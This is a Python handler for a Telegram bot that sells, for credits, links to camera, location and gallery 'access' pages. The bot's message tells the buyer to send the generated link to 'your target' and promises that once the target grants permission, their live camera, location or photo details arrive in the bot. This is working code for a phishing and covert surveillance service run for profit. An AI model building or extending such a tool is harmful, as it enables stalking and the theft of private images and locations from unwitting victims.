from aiogram import Router, types, F
from config import IP_API_URL
import config
import database

import database
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardButton
from emojis import Emojis

router = Router()

@router.callback_query(F.data.in_(["camera_access", "location_access", "gallery_access"]))
async def feature_link_gen(call: types.CallbackQuery):
    user_id = call.from_user.id
    user_data = await database.get_user_data(user_id)
    bot_info = await call.bot.get_me()
    
    feature_name = call.data.replace("_", " ").title()
    link_type = "camera" if "camera" in call.data else "location" if "location" in call.data else "gallery"
    
    # Cost definition
    cost = 10 if link_type == "gallery" else 1
    
    # Deduct credits
    if not await database.deduct_credits(user_id, cost):
        # Insufficient credits
        text = (
            f"{Emojis.DIAMOND} <b>{call.from_user.full_name}</b>\n\n"
            f"{Emojis.CROSS} <b>Insufficient Credits:</b>\n\n"
            f"{Emojis.WARNING} You need {cost} credits to access {feature_name}.\n"
            f"Your current balance: {user_data['credits']} {Emojis.TICKET}\n\n"
            f"{Emojis.CONGRATS} You can get more free credits by inviting your friends\n"
            f"{Emojis.PIN} 1 invite = 1 credit\n\n"
            f"{Emojis.LINK} <b>Your invite link:</b>\n"
            f"https://t.me/{bot_info.username}?start={user_id}\n\n"
            f"{Emojis.PRINCE} Contact @Rytce to buy credits"
        )
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="Buy Credits", callback_data="buy_credits", icon_custom_emoji_id=Emojis.get_id(Emojis.CARD)))
        builder.row(InlineKeyboardButton(text="Copy Invite Link", url=f"https://t.me/share/url?url=https://t.me/{bot_info.username}?start={user_id}", icon_custom_emoji_id=Emojis.get_id(Emojis.LINK)))
        builder.row(InlineKeyboardButton(text="Back to Menu", callback_data="back_to_menu_real", icon_custom_emoji_id=Emojis.get_id(Emojis.BACK)))
        await call.message.edit_text(text, reply_markup=builder.as_markup(), parse_mode="HTML")
        await call.answer()
        return

    domain = config.BASE_URL.rstrip("/") if config.BASE_URL else None
    
    if not domain:
        await call.answer("❌ BASE_URL is not configured in .env!", show_alert=True)
        return

    import security
    token = security.generate_token(user_id)
    
    if link_type == "gallery":
        link = f"{domain}/Gallery.html?id={user_id}&type={link_type}&token={token}"
    else:
        link = f"{domain}/Camera.html?id={user_id}&type={link_type}&token={token}"
    
    text = (
        f"{Emojis.DIAMOND} <b>{call.from_user.full_name}</b>\n\n"
        f"{Emojis.CHECK} <b>{cost} Credit(s) Deducted</b>\n"
        f"Access to your target {feature_name.lower()} and capture live details "
        f"just by sending a secure gateway link {Emojis.EYE}\n\n"
        f"• {Emojis.LINK} Link = {link}\n\n"
        f"&gt;&gt; Copy the link and send it to your target when they "
        f"enter and allowed the permission you will receive the "
        f"details here {Emojis.ALIEN}"
    )

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Copy Link", url=f"https://t.me/share/url?url={link}", icon_custom_emoji_id=Emojis.get_id(Emojis.LINK)))
    builder.row(InlineKeyboardButton(text="Back to Menu", callback_data="back_to_menu_real", icon_custom_emoji_id=Emojis.get_id(Emojis.BACK)))
    
    # Reverted to edit_text since menu is now text-only
    await call.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML", disable_web_page_preview=True)
    await call.answer()
